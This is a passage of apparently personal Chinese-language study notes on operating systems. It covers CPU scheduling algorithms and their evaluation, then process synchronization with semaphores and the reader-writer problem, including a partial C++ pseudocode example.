id="5-1-4-分派程序"><a href="#5-1-4-分派程序" class="headerlink" title="5.1.4 分派程序"></a>5.1.4 分派程序</h4><p>分派程序是一个模块，用来将CPU 的控制交给由短期调度程序选择的进程。其功能包括：</p><ul><li>切换上下文。</li><li>切换到用户模式。</li><li>跳转到用户程序的合适位置， 以重新启动程序。</li></ul><p>分派程序应尽可能快， 因为在每次进程切换时都要使用。分派程序停止一个进程而启动另一个所要花的时间称为分派延迟（dispatch latency）。</p><h3 id="5-2-调度准则"><a href="#5-2-调度准则" class="headerlink" title="5.2 调度准则"></a>5.2 调度准则</h3><ul><li><strong>CPU 使用率</strong>： 需要使CPU 尽可能忙。从概念上讲， CPU 使用率从0%～100%。对于真实系统， 它应从40% C轻负荷系统）～90%（重负荷系统）。</li><li><strong>吞吐量</strong>：如果CPU 忙于执行进程，那么就有工作在完成。一种测量工作量的方法称为在吞吐量， 它指一个时间单元内所完成进程的数量。对于长进程，吞吐量可能为每小时一个进程：对于短进程， 吞吐量可能为每秒10 个进程。</li><li><strong>周转时间</strong>：从一个特定进程的角度来看， 一个重要准则是运行该进程需要多长时间。从进程提交到进程完成的时间段称为周转时间。周转时间为所有时间段之和， 包括等待进入内存、在就绪队列中等待、在CPU 上执行和νo执行。</li><li><strong>等待时间</strong>： CPU 调度算法并不影响进程运行和执行I/O的时间： 它只影响进程在就绪队列中等待所花的时间。等待时间为在就绪队列中等待所花费时间之和。</li><li><strong>响应时间</strong>： 对于交互系统， 周转时间并不是最佳准则。通常， 进程能相当早就产生输出， 并继续计算新结果同时输出以前的结果给用户。因此， 另一时间是从提交请求到产生第一响应的时间。这种时间称为响应时间， 是开始响应所需要的时间， 而不是输出响应所需要的时间。周转时间通常受输出设备速度的限制。</li></ul><p>需要使CPU 使用率和吞吐量最大化，而使周转时间、等待时间和响应时间最小化。</p><h3 id="5-3-调度算法"><a href="#5-3-调度算法" class="headerlink" title="5.3 调度算法"></a>5.3 调度算法</h3><h4 id="5-3-1-先到先服务调度（FCFS）"><a href="#5-3-1-先到先服务调度（FCFS）" class="headerlink" title="5.3.1 先到先服务调度（FCFS）"></a>5.3.1 先到先服务调度（FCFS）</h4><p><strong>first-come，first-served</strong></p><p>先请求CPU 的进程先分配到CPU。</p><p>FCFS是非抢占的</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211103111439645.png" alt="image-20211103111439645"></p><h4 id="5-3-2-最短作业优先调度-SJF"><a href="#5-3-2-最短作业优先调度-SJF" class="headerlink" title="5.3.2 最短作业优先调度(SJF)"></a>5.3.2 最短作业优先调度(SJF)</h4><p><strong>shortest job-first (SJF) scheduling algorithm</strong> </p><p>这一算法将每个进程与其下一个CPU 区间段相关联。当CPU 为空闲时，它会赋给具有最短CPU 区间的进程。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211103112112804.png" alt="image-20211103112112804"></p><p>SJF 调度算法可证明为最佳的， 这是因为对于给定的一组进程， SJF 算法的平均等待时间最小。</p><p>SJF调度经常用于长期调度。</p><p>对于短期调度，一种方法是使用近似SJF调度，虽然不知道下一个CPU区间的长度，但是可以预测它。认为下一个CPU区间的长度与以前的相似。下一个CPU区间通常可预测为以前CPU区间的测量长度的指数平均。</p><p>SJF 算法可能是抢占的或非抢占的。</p><p>抢占SJF 调度有时称为<strong>最短剩余时间优先调度</strong>（shortest-remaining-time-first scheduling）。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211103113129077.png" alt="image-20211103113129077"></p><h4 id="5-3-3-优先级调度"><a href="#5-3-3-优先级调度" class="headerlink" title="5.3.3 优先级调度"></a>5.3.3 优先级调度</h4><p><strong>priority scheduling algorithm</strong></p><p>每个进程都有一个优先级与其关联，具有最高优先级的进程会分配到CPU。具有相同优先级的进程按FCFS 顺序调度。SJF 算法属于简单优先级算法，其优先级（p） 为下一个（预测的） CPU 区间的倒数。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211103113523515.png" alt="image-20211103113523515"></p><p>优先调度可以是<strong>抢占的或者非抢占</strong>的。当一个进程到达就绪队列时， 其优先级与当前运行进程的优先级相比较。如果新到达进程的优先级高于当前运行进程的优先级，那么抢占优先级调度算法会抢占CPU。而非抢占优先级调度算法只是将新进程加到就绪队列的头部。</p><p>优先级调度算法的一个主要问题是<strong>无穷阻塞</strong>（indefinite blocking）或饥饿（ starvation）。可以运行但缺乏CPU 的进程可认为是阻塞的，它在等待CPU。优先级调度算法会使某个低优先级进程无穷等待CPU。</p><p>低优先级进程无穷等待问题的解决之一是<strong>老化</strong>（aging）。老化是一种技术，以逐渐增加在系统中等待很长时间的进程的优先级。</p><h4 id="5-3-4-轮转法调度-RR"><a href="#5-3-4-轮转法调度-RR" class="headerlink" title="5.3.4 轮转法调度(RR)"></a>5.3.4 轮转法调度(RR)</h4><p>轮转法（round-robin, RR） 调度算法是专门为分时系统设计的。它类似于FCFS 调度，但是增加了抢占以切换进程。定义一个较小时间单元称为时间片（ time quantun, or time slice)。时间片通常为10~100ms。将就绪队列作为循环队列。CPU调度程序循环就绪队列为每个进程分配不超过ー个时间片的CPU。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211103114645373.png" alt="image-20211103114645373"></p><p>RR算法的性能很大程度上依赖于时间片的大小。在极端情况下，如果时间片非常大，那么RR算法与FCFS算法一样，如果时间片很小(如1ms):那么R算法称为处理器共享。</p><h4 id="5-3-5-多级队列调度"><a href="#5-3-5-多级队列调度" class="headerlink" title="5.3.5 多级队列调度"></a>5.3.5 多级队列调度</h4><p><strong>多级队列调度算法</strong>（multilevel queue scheduling algori也m）将就绪队列分成多个独立队列（见图5.6〕。根据进程的属性， 如内存大小、进程优先级、进程类型， 一个进程被永久地分配到一个队列。每个队列有自己的调度算法。例如， 前台进程和后台进程可处于不同队列。前台队列可能采用RR 算法调度， 而后台队列可能采用FCFS 算法调度。</p><p>另外， 队列之间必须有调度， 通常采用固定优先级抢占调度。例如， 前台队列可以比后台队列具有绝对的优先级。且是抢占式的。</p><p>另一种可能是在队列之间划分时间片。每个队列都有一定的CPU时间，这可用于调度队列内的进程。例如， 对于前台－后台队列的例子， 前台队列可以有80%的CPU时间用于在进程之间进行RR调度， 而后台队列可以有20%的CPU时间采用FCFS算法调度进程。</p><p>优点是低调度开销， 缺点是不够灵活</p><h4 id="5-3-6-多级反馈队列调度"><a href="#5-3-6-多级反馈队列调度" class="headerlink" title="5.3.6 多级反馈队列调度"></a>5.3.6 多级反馈队列调度</h4><p><strong>多级反馈队列调度算法</strong>（multilevelfeedback queue scheduling a lgorithm）允许进程在队列之间移动。主要思想是根据不同CPU区间的特点以区分进程。如果进程使用过多CPU时间， 那么它会被转移到更低优先级队列。这种方案将I/O约束和交互进程留在更高优先级队列。此外， 在较低优先级队列中等待时间过长的进程会被转移到更高优先级队列。这种形式的老化阻止饥饿的发生。</p><h3 id="5-4-多处理器调度"><a href="#5-4-多处理器调度" class="headerlink" title="5.4 多处理器调度"></a>5.4 多处理器调度</h3><h4 id="5-4-1-多处理器调度的方法"><a href="#5-4-1-多处理器调度的方法" class="headerlink" title="5.4.1 多处理器调度的方法"></a>5.4.1 多处理器调度的方法</h4><p>一种是种<strong>非对称多处理</strong>（asymmetric multiprocessing）方法。是让一个处理器（主服务器）处理所有的调度决定、I/O处理以及其他系统活动， 其他的处理器只执行用户代码。</p><p>另一种方法是使用<strong>对称多处理</strong>（ symmetric multiprocessing, <strong>SMP</strong>）方法， 即每个处理器自我调度。所有进程可能处于一个共同的就绪队列中， 或每个处理器都有它自己的私有就绪进程队列。无论如何，调度通过每个处理器检查共同就绪队列并选择一个进程来执行。</p><h4 id="5-4-2-处理器亲和性"><a href="#5-4-2-处理器亲和性" class="headerlink" title="5.4.2 处理器亲和性"></a>5.4.2 处理器亲和性</h4><p>处理器亲和性有几种形式。当一个操作系统具有设法让一个进程保持在同一个处理器上运行的策略， 但不能做任何保证时， 则会出现<strong>软亲和性</strong>（ soft affinity ）。 此时， 进程可能<br>在处理器之间移动。有些系统， 如Linux， 还提供一个支持<strong>硬亲和性</strong>（ hard affinity） 的系统调用， 从而允许进程指定它不允许移至其他处理器上。</p><h4 id="5-4-3-负载平衡"><a href="#5-4-3-负载平衡" class="headerlink" title="5.4.3 负载平衡"></a>5.4.3 负载平衡</h4><h4 id="5-4-4-对称多线程"><a href="#5-4-4-对称多线程" class="headerlink" title="5.4.4 对称多线程"></a>5.4.4 对称多线程</h4><h3 id="5-5-线程调度"><a href="#5-5-线程调度" class="headerlink" title="5.5 线程调度"></a>5.5 线程调度</h3><h4 id="5-5-1-竞争范国"><a href="#5-5-1-竞争范国" class="headerlink" title="5.5.1 竞争范国"></a>5.5.1 竞争范国</h4><h4 id="5-5-2-Pthread调度"><a href="#5-5-2-Pthread调度" class="headerlink" title="5.5.2 Pthread调度"></a>5.5.2 Pthread调度</h4><h3 id="5-6-操作系统实例"><a href="#5-6-操作系统实例" class="headerlink" title="5.6 操作系统实例"></a>5.6 操作系统实例</h3><h4 id="5-6-1-实例：-Solaris调度"><a href="#5-6-1-实例：-Solaris调度" class="headerlink" title="5.6.1 实例： Solaris调度"></a>5.6.1 实例： Solaris调度</h4><h4 id="5-6-2-实例：-Windows-XP调度"><a href="#5-6-2-实例：-Windows-XP调度" class="headerlink" title="5.6.2 实例： Windows XP调度"></a>5.6.2 实例： Windows XP调度</h4><h4 id="5-6-3-实例：-Linux调度"><a href="#5-6-3-实例：-Linux调度" class="headerlink" title="5.6.3 实例： Linux调度"></a>5.6.3 实例： Linux调度</h4><h3 id="5-7-算法评估"><a href="#5-7-算法评估" class="headerlink" title="5.7 算法评估"></a>5.7 算法评估</h3><h4 id="5-7-1-确定模型"><a href="#5-7-1-确定模型" class="headerlink" title="5.7.1 确定模型"></a>5.7.1 确定模型</h4><p>一种类型的分析评估是确定模型法（ deterministic modeling）。这种方法采用特殊预先确定的负荷， 计算在给定负荷下每个算法的性能。</p><p>确定模型不但简单而且快速。它给出了数字， 以允许人们对算法进行比较。然而， 它要求输入为精确数字， 而且其答案只适用于这些情况。确定模型的主要用途在于描述调度算法和提供例子。</p><h4 id="5-7-2-排队模型"><a href="#5-7-2-排队模型" class="headerlink" title="5.7.2 排队模型"></a>5.7.2 排队模型</h4><p>知道了到达率和服务率， 可计算使用率、平均队列长度、平均等待时间等。这种研究称为排队网络分析（queueing-network analysis）。</p><p>作为一个例子， 设n为平均队列长度（不包括正在服务的进程）， w 为队列的平均等待时间，A为新进程到达队列的平均到达率（如每秒三个进程）。那么，在进程等待的W时间内， 则有λ ×w个新进程到达队列。如果系统处于稳定状态， 那么离开队列的进程的数量必须等于到达进程的数量。</p><p>因此，    <strong>n ＝ λ × W</strong><br>这一公式称为Little公式。Little 公式特别有用， 因为它适用于任何调度算法和到达分布。</p><h4 id="5-7-3-模拟"><a href="#5-7-3-模拟" class="headerlink" title="5.7.3 模拟"></a>5.7.3 模拟</h4><p>为了获得更为精确的调度算法评估， 可使用模拟（simulation）。模拟涉及对计算机系统进行建模。软件数据结构表示系统的主要组成部分。模拟程序有一个变量以表示时钟；当该变量的值增加时， 模拟程序会修改系统状态以反映设备、进程和调度程序的活动。随着模拟程序的执行， 用以表示算法性能的统计数字可以被收集并打印出来。</p><h4 id="5-7-4-实现"><a href="#5-7-4-实现" class="headerlink" title="5.7.4 实现"></a>5.7.4 实现</h4><p>针对评估调度算法， 唯一完全精确的方法是对它进行编程， 将它放在操作系统内， 并观测它如何工作。这一方法将真实算法放入操作系统，然后在真实操作系统内进行评估。</p><h3 id="5-8-小结"><a href="#5-8-小结" class="headerlink" title="5.8 小结"></a>5.8 小结</h3><p>CPU 调度的任务是从就绪队列中选择一个等待进程，并为其分配CPU。CPU由调度程序分配给所选中的进程。</p><p>先到先服务（FCFS）调度是最简单的调度算法，但是它会让短进程等待非常长的进程。</p><p>最短作业优先（ SJF ）调度可证明是最佳的，它提供了最短平均等待时间。实现SJF 调度比较困难，因为预测下一个CPU区间的长度有难度。SJF算法是通用优先级调度算法（将CPU 简单地分配给具有最高优先级的进程〉的特例。优先级和SJF调度会产生饥饿。老化技术可阻止饥饿。</p><p>轮转法（RR）调度对于分时（交互〉系统更为合适。RR调度让就绪队列的第一个进程使用CPU 的q个时间单元，这里q是时间片。在q时间单元之后，如果该进程还没有释放CPU，那么它被抢占并放到就绪队列的尾部。该算法的主要问题是选择时间片。如果时间片太大， 那么RR调度就成了FCFS调度；如果时间片太小， 那么因上下文切换而引起的调度开销就过大。</p><p>FCFS算法是非抢占的，而RR算法是抢占的。SJF和优先级算法可以是抢占的，也可以是非抢占的。</p><p>多级队列调度算法允许多个不同算法用于各种类型的进程。最为常用的模型包括使用眼调度的前台交互队列，以及使用FCFS 调度的后台批处理队列。多级反馈队列调度算法允许进程在队列之间迁移。</p><p>许多当前的计算机系统支持多处理器， 井允许每个处理器独立地调度它自己。通常，每个处理器维护自己的私有进程（或线程）队列， 它们都可以运行。与多处理器调度相关<br>的问题包括处理器亲和性和负载平衡。</p><p>如果操作系统在内核级支持线程， 那么必须调度线程而不是进程来执行。Solaris和Windows XP就是这样的系统， 它们采用抢占的、基于优先级的调度算法， 并支持实时线程。Linux进程调度也使用基于优先级算法， 并提供实时支持。这三种操作系统通常偏爱交互进程而不是批处理进程或CPU 约束进程。</p><p>因为有多种不同的调度算法可用， 所以需要某种方法来选择它们。分析方法使用数学分析以确定算法性能。模拟方法通过对代表性的进程采用调度算法模拟并计算其性能来确定优劣。不过， 模拟最多也只是提供对真实系统性能的近似， 评估调度算法唯一可靠的技术是在真实系统上的实现算法并在真实环境中进行性能跟踪。</p><h3 id="5-9-习题"><a href="#5-9-习题" class="headerlink" title="5.9 习题"></a>5.9 习题</h3><p><strong>5.1 为什么对调度来说，区分I/0 限制的程序和CPU 限制的程序是重要的？</strong></p><blockquote><p>I /0 限制的程序有在运行I /0 操作前只运行很少数量的计算机操作的性质。这种程序一般来说不会使用很多的CPU。 但是 CPU 限制的程序会利用整个的时间片，且不做任何阻碍I/0 操作的工作。</p><p>I/O约束程序通常具有很多短CPU区间。CPU约束程序可能有少量的长CPU区间。</p><p>因此，通过给I/0 限制的程序优先权和允许在CPU 限制的程序之前运行， 可以很好的利用计算机资源</p></blockquote><p><strong>5.10 解释下面调度算法对短进程偏好程度上的区别：</strong><br><strong>a. FCFS</strong><br><strong>b. RR</strong><br><strong>c. 多级反馈队列</strong></p><blockquote><p>a. FCFS一一区别短任务是因为任何在长任务之后到达的短任务部将会有很长的等待时间.<br>b. RR一一对所有的任务都是能够相同的（给它们相同的CPU 时间区间） ， 所以， 短任务可以很快的离开系统， 只要它们可以先完成．<br>c . 多级反馈队列和RR 调度算法相似一一它们不会先选择短任务。</p></blockquote><h2 id="第6章进程同步"><a href="#第6章进程同步" class="headerlink" title="第6章进程同步"></a>第6章进程同步</h2><h3 id="6-1-背景"><a href="#6-1-背景" class="headerlink" title="6.1 背景"></a>6.1 背景</h3><p>允许两个进程并发操作变量counter会得到不正确的状态。</p><p>多个进程并发访问和操作同一数据且执行结果与访问发生的特定顺序有关， 称为竞争条件（race condition）。为了避免竞争条件， 需要确保一段时间内只有一个进程能操作变量counter。为了实现这种保证， 要求进行一定形式的进程同步。</p><h3 id="6-2-临界区问题"><a href="#6-2-临界区问题" class="headerlink" title="6.2 临界区问题"></a>6.2 临界区问题</h3><p>每个进程有一个代码段称为<strong>临界区</strong>（critical section）， 在该区中进程可能改变共同变量、更新一个表、写一个文件等。</p><p>这种系统的<strong>重要特征</strong>是当一个进程进入临界区， 没有其他进程可被允许在临界区内执行， 即没有两个进程可同时在临界区内执行。</p><p><strong>临界区问题</strong>(critical-section problem ） 是设计一个以便进程协作的协议。每个进程必须请求允许进入其<strong>临界区</strong>。实现这一请求的代码段称为<strong>进入区</strong>（entry section）， 临界区之后可有<strong>退出区</strong>（exit section）， 其他代码为剩余区（remainder section）。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116161533895.png" alt="image-20211116161533895"></p><p>临界区问题的解答必须满足如下三项要求：</p><ul><li><strong>互斥</strong>（mutual exclusion）： 如果进程P； 在其临界区<br>内执行， 那么其他进程都不能在其临界区内执行。</li><li><strong>有空让进</strong>（progress）： 如果没有进程在其临界区内执行，且有进程需进入临界区，那么只有那些不在剩余区内执行<br>的进程可参加选择， 以确定谁能下一个进入临界区， 且这种选择不能无限推迟。</li><li><strong>有限等待</strong>(bounded waiting）：从一个进程做出进入临界区的请求， 直到该请求允许为止， 其他进程允许进入其临界区的次数有上限。</li></ul><h3 id="6-3-Peterson算法"><a href="#6-3-Peterson算法" class="headerlink" title="6.3 Peterson算法"></a>6.3 Peterson算法</h3><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116161739706.png" alt="image-20211116161739706"></p><h3 id="6-3-0-面包师算法"><a href="#6-3-0-面包师算法" class="headerlink" title="6.3.0 面包师算法"></a>6.3.0 面包师算法</h3><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116161850602.png" alt="image-20211116161850602"></p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116161908057.png" alt="image-20211116161908057"></p><h3 id="6-4-硬件同步"><a href="#6-4-硬件同步" class="headerlink" title="6.4 硬件同步"></a>6.4 硬件同步</h3><p>TestAndSet()</p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116162032902.png" alt="image-20211116162032902"><p>Swap()</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116162152258.png" alt="image-20211116162152258"></p><p>上面两种算法未解决互斥</p><p>boolean waiting[n];<br>boolean lock;</p><p>这些数据结构均初始化false。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116162305381.png" alt="image-20211116162305381"></p><ul><li><p>互斥</p><p>为了证明满足互斥要求，注意，只有waiting[i]==false 或key==flase 时， 进程P<del>i</del> 才进入临界区。只有当TestAndSet执行时， key的值才变成false。执行TestAndSet的第一个进程会发现key==false；所有其他进程必须等待。只有其他进程离开其临界区时，变量waiting[i］的值才能变成false：每次只有一个waiting[i］被设置为false,以满足互斥要求。</p></li><li><p>有空让进</p><p>任何一个已经进入CS的进程在“exit section” 时，设置：lock =false 或 waiting[ j ]= false，确保了至少可以让一个进程进入CS</p></li><li><p>有限等待条件</p><p>任何一个已经进入CS的进程Pi在“exit section” 时， 将会依次扫描waiting 数组（i+1,i+2,…n-1,0,…i-1)，并仅将Pi后面最先找到的进程j的waiting[ j]设置为false</p><p>这就使进程能依此循环进入CS</p></li></ul><p><strong>硬件指令实现的缺点</strong></p><ul><li>硬件指令虽然可以有效地保证进程间互斥，但有一个缺点，就是当进程正在临界段中执行时，其它想进入临界段的进程必须不断地测试布尔变量lock的值，这就造成了处理机机时的浪费，我们常称这种情况为“忙等待”</li><li>可能“饥饿”<strong>：</strong>如果从等待进程中随机选择一个进入临界区<strong>，</strong>有的进程可能一直选不上<strong>。</strong></li></ul><h3 id="6-5-信号量"><a href="#6-5-信号量" class="headerlink" title="6.5 信号量"></a>6.5 信号量</h3><p>信号量S是个整数变量，除了初始化外，它只能通过两个标准原子操作：wait()和signal()来访问。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116162927219.png" alt="image-20211116162927219"></p><h4 id="6-5-1-用法"><a href="#6-5-1-用法" class="headerlink" title="6.5.1 用法"></a>6.5.1 用法</h4><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116163758185.png" alt="image-20211116163758185"></p><h4 id="6-5-2-实现"><a href="#6-5-2-实现" class="headerlink" title="6.5.2 实现"></a>6.5.2 实现</h4><p>信号量的主要缺点是都要求<strong>忙等待</strong>（busy waiting）。当一个进程位于其临界区内时， 任何其他试图进入其临界区的进程都必须在其进入代码中连续地循环。这种类型的信号量也称<br>为<strong>自旋锁</strong>（spinlock）</p><p>为了克服忙等， 可以修改信号量操作wait()和signal()的定义。当一个进程执行wait()操作时， 发现信号量值不为正， 则它必须等待。然而， 该进程不是忙等而是阻塞自己。阻塞操作将一个进程放入到与信号量相关的等待队列中，井将该进程的状态切换成等待状态。接着， 控制转到CPU调度程序， 以选择另一个进程来执行。</p><p>一个被阻塞在等待信号量S上的进程，可以在其他进程执行signal()操作之后被重新执行。该进程的重新执行是通过wakeup()操作来进行的， 该操作将进程从等待状态切换到就<br>绪状态。接着， 该进程被放入到就绪队列中（根据CPU调度算法的不同，CPU有可能会、也可能不会从正在运行的进程切换到刚刚就绪的进程）。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116164332005.png" alt="image-20211116164332005"></p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116164343388.png" alt="image-20211116164343388"></p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116165105798.png" alt="image-20211116165105798"></p><h4 id="6-5-3-死锁与饥饿"><a href="#6-5-3-死锁与饥饿" class="headerlink" title="6.5.3 死锁与饥饿"></a>6.5.3 死锁与饥饿</h4><p><strong>死锁</strong>：两个或多个进程无限地等待一个事件，而该事件只能由这些等待进程之一来产生。这里的事件是signal()操作的执行。当出现这样的状态时， 这些进程就称为死锁（deadlocked）。</p><p><strong>无限期阻塞</strong>(indefinite blocking）或<strong>饥饿</strong>（starvation）：即进程在信号量内无限期等待。如果对与信号量相关的链表按LIFO顺序来增加和移动进程，<br>那么可能会发生无限期阻塞。</p><h4 id="6-5-4-信号量小结"><a href="#6-5-4-信号量小结" class="headerlink" title="6.5.4 信号量小结"></a>6.5.4 信号量小结</h4><ol><li><p><strong>信号量的物理含义：</strong></p><p> <strong>S&gt;0：</strong>表示有S个资源可用</p><p> <strong>S=0：</strong>表示无资源可用</p><p> <strong>S&lt;0：</strong>则|S|表示S等待队列中的进程个数</p><p> <strong>P(S)：</strong>表示申请一个资源</p><p> <strong>V(S)：</strong>表示释放一个资源。</p></li><li><p><strong>P.V操作必须成对出现，有一个P操作就一定有一个V操作</strong></p><p> 当为<strong>互斥操作</strong>时，它们同处于同一进程</p><p> 当为<strong>同步操作</strong>时，则不在同一进程中出现</p><p> 如果P(S1)和P(S2)两个操作在一起，那么P操作的顺序至关重要,一个同步P操作与一个互斥P操作在一起时，同步P操作在互斥P操作前。</p><p> 而两个V操作无关紧要</p></li><li><p><strong>P.V操作的优缺点</strong></p><ul><li>优点：简单，而且表达能力强（用P.V操作可解决任何同步互斥问题）</li><li>缺点：不够安全；P.V操作使用不当会出现死锁；遇到复杂同步互斥问题时实现复杂</li></ul></li></ol><p> <strong>而两个V操作无关紧要</strong></p><h3 id="6-6-经典同步问题"><a href="#6-6-经典同步问题" class="headerlink" title="6.6 经典同步问题"></a>6.6 经典同步问题</h3><p>使用PV操作完成进程间的<strong>同步与互斥步骤</strong>：</p><ol><li>分析同步关系（制约关系）</li><li>设置信号量（一般情况下，有几项制约条件就应设置几个信号量）</li><li>选择并确定信号量的初值（初值和初始可用资源有关）</li><li>利用PV操作写出同步关系。</li></ol><h4 id="6-6-1-有限缓冲问题"><a href="#6-6-1-有限缓冲问题" class="headerlink" title="6.6.1 有限缓冲问题"></a>6.6.1 有限缓冲问题</h4><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116164843159.png" alt="image-20211116164843159"></p><p>下图会发生死锁，生产者一直等待</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116165556108.png" alt="image-20211116165556108"></p><h4 id="6-6-2-读者写者问题"><a href="#6-6-2-读者写者问题" class="headerlink" title="6.6.2 读者写者问题"></a>6.6.2 读者写者问题</h4><p><strong>制约条件分析：</strong></p><p>1、允许多个进程同时读文件（读－读允许）；<br>2、不允许在进程读文件时让另外一进程去写文件；有进程在写文件时不让另外一个进程去读该文件（“读-写”互斥）；<br>3、不允许多个写进程同时写同一文件（“写-写”互斥）。</p><h5 id="读者优先："><a href="#读者优先：" class="headerlink" title="读者优先："></a><strong>读者优先：</strong></h5><p>只要不断的有读者来读，那么readcount就一直会大于0，那么永远不会触发signal(wrt)条件，从而导致写者饥饿。</p><p>该问题被称为第一读者优先问题 </p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116170507558.png" alt="image-20211116170507558"></p><h5 id="写者优先"><a href="#写者优先" class="headerlink" title="写者优先:"></a><strong>写者优先:</strong></h5><p>1.写者线程的优先级高于读者线程。<br>2.当写者到来时，只有那些已经获得授权的读进程才被允许完成它们的操作，写者之后到来的读者将被推迟，直到写者完成。<br>3.当没有写者进程时读者进程应该能够同时读取文件。</p><p><strong>具体实现:</strong><br>1.通过添加信号量<code>read</code>实现写者到来时能够阻止读者进程。<br>2.设置信号量<code>fileSrc</code>实现读写者对临界资源的访问。<br>3.设置计数器<code>writeCount</code>来统计当前阻塞的写者进程的数目，设置信号量<code>writeCountSignal</code>完成对<code>writeCount</code>计数器资源的互斥访问。<br>4.设置计数器<code>readCount</code>来统计访问临界资源的读者数目，设置信号量<code>readCountSignal</code>完成对<code>readCount</code>计数器资源的互斥访问。</p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116170755343.png" alt="image-20211116170755343"></p><h5 id="读者写者公平竞争："><a href="#读者写者公平竞争：" class="headerlink" title="读者写者公平竞争："></a>读者写者公平竞争：</h5><ol><li>优先级相同。</li><li>写者、读者互斥访问。</li><li>只能有一个写者访问临界区。</li><li>可以有多个读者同时访问临界资源。</li></ol><p><strong>具体实现:</strong></p><ol><li>设置<code>file</code>信号量实现对临界资源的互斥访问。</li><li>设置计数器<code>readCount</code>实现多个读者访问临界资源，通过设置信号量<code>readCountSignal</code>实现对<code>readCount</code>计数器的互斥访问。</li><li>设置信号量<code>keySignal</code>实现读者和写者的公平竞争（令牌）。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* 读者队列初始值为0，其他资源初始值为1*/</span><br><span class="hljs-keyword">int</span> readCount = <span class="hljs-number">0</span>;<br>semaphore keySignal = <span class="hljs-number">1</span>;<br>semaphore fileSrc = <span class="hljs-number">1</span>;<br>semaphore readCountSignal = <span class="hljs-number">1</span>;<br><br><span class="hljs-built_in">reader</span>()<br>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)<br>    &#123;<br>      <span class="hljs-built_in">wait</span>(keySignal);        <span class="hljs-comment">//申请令牌</span><br>      <span class="hljs-built_in">wait</span>(readCountSignal);  <span class="hljs-comment">//申请计数器资源</span><br>      <span class="hljs-keyword">if</span>(!readCount)          <span class="hljs-comment">//为零则申请文件资源</span><br>         <span class="hljs-built_in">wait</span>(fileSrc);<br>      readCount++;<br>      <span class="hljs-built_in">signal</span>(readCountSignal); <span class="hljs-comment">//释放计数器资源</span><br>      <span class="hljs-built_in">signal</span>(keySignal);      <span class="hljs-comment">//释放令牌</span><br> <br>      ...<br>      perform read operation  <span class="hljs-comment">//执行临界区代码</span><br>      ...<br>  <br>      <span class="hljs-built_in">wait</span>(readCountSignal);  <span class="hljs-comment">//申请计数器资源</span><br>      readCount--;<br>      <span class="hljs-keyword">if</span>(!readCount)                <span class="hljs-comment">//为零则释放文件资源</span><br>         <span class="hljs-built_in">signal</span>(fileSrc);<br>      <span 